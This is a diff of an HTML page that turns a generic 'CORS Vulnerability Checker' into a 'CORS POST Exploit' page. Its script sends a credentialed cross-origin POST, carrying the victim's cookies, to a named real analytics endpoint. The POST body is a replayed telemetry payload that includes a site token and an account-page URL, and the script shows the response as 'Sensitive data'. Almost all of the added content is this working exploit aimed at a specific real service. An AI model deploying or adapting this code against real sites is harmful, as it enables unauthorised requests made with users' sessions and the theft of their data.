@@ -1,35 +1,103 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Vulnerability Checker</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        input {
-            padding: 10px;
-            font-size: 16px;
-        }
-        button {
-            padding: 10px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS POST Exploit</title>
 </head>
 <body>
-    <h1>CORS Vulnerability Checker</h1>
-    <p>Enter a target URL to check for CORS vulnerability:</p>
-    <input type="text" id="targetUrl" placeholder="https://example.com">
-    <button onclick="checkCORS()">Check CORS</button>
-    <hr>
-     <p>Enter a target URL with post request to check for CORS vulnerability:</p>
-    <input type="text" id="targetUrl" placeholder="https://example.com">
-    <button onclick="checkCORSpost()">POST</button>
-    <script src="script.js"></script>
-    <script src="script1.js"></script>
+  <h1>CORS POST Exploit Example</h1>
+  <p>Click the button to exploit the CORS misconfiguration using POST.</p>
+  <button id="exploitButton">Exploit</button>
+
+  <p id="result">No data yet.</p>
+
+  <script>
+    document.getElementById('exploitButton').addEventListener('click', function() {
+      var xhr = new XMLHttpRequest();
+      xhr.withCredentials = true;  // Important for sending credentials (cookies, HTTP auth)
+      xhr.open('POST', 'https://report-uri.com/cdn-cgi/rum?', true);  // Target URL using POST method
+
+      // Set headers for the POST request, if required
+      xhr.setRequestHeader('Content-Type', 'application/json');  // Adjust based on target needs
+
+      xhr.onload = function() {
+        if (xhr.status === 204) {
+          document.getElementById('result').textContent = 'Sensitive data: ' + xhr.responseText;
+        } else {
+          document.getElementById('result').textContent = 'Error: ' + xhr.status;
+        }
+      };
+
+      // Send the POST data; adjust based on what the server expects
+      var postData = JSON.stringify({
+        memory: {
+          totalJSHeapSize: 13504282,
+          usedJSHeapSize: 12580754,
+          jsHeapSizeLimit: 4294705152
+        },
+        resources: [],
+        referrer: "https://report-uri.com/",
+        eventType: 1,
+        firstPaint: 1598,
+        firstContentfulPaint: 1598,
+        startTime: 1727948626269.1,
+        versions: {
+          fl: "2024.8.0",
+          js: "2024.6.1",
+          timings: 2
+        },
+        pageloadId: "74fa1f59-b92e-4ab5-af48-336ef3e37810",
+        location: "https://report-uri.com/account",
+        nt: "navigate",
+        serverTimings: [],
+        timingsV2: {
+          unloadEventStart: 0,
+          unloadEventEnd: 0,
+          domInteractive: 1611.4000000059605,
+          domContentLoadedEventStart: 1614.300000011921,
+          domContentLoadedEventEnd: 1619.800000011921,
+          domComplete: 1657.7000000178814,
+          loadEventStart: 1657.7000000178814,
+          loadEventEnd: 1659.5,
+          type: "navigate",
+          redirectCount: 0,
+          criticalCHRestart: 0,
+          activationStart: 0,
+          initiatorType: "navigation",
+          nextHopProtocol: "h2",
+          workerStart: 0,
+          redirectStart: 0,
+          redirectEnd: 0,
+          fetchStart: 7.5999999940395355,
+          domainLookupStart: 7.5999999940395355,
+          domainLookupEnd: 7.5999999940395355,
+          connectStart: 7.5999999940395355,
+          connectEnd: 7.5999999940395355,
+          secureConnectionStart: 7.5999999940395355,
+          requestStart: 12.400000005960464,
+          responseStart: 1348.4000000059605,
+          responseEnd: 1351.9000000059605,
+          transferSize: 28238,
+          encodedBodySize: 27938,
+          decodedBodySize: 27938,
+          deliveryType: "",
+          renderBlockingStatus: "non-blocking",
+          responseStatus: 200,
+          firstInterimResponseStart: 0,
+          name: "https://report-uri.com/account",
+          entryType: "navigation",
+          startTime: 0,
+          duration: 1659.5
+        },
+        dt: "",
+        siteToken: "2d80a840948646ca9ed28b498e73a651",
+        st: 2
+      });
+
+      xhr.send(postData);
+    });
+  </script>
 </body>
 </html>
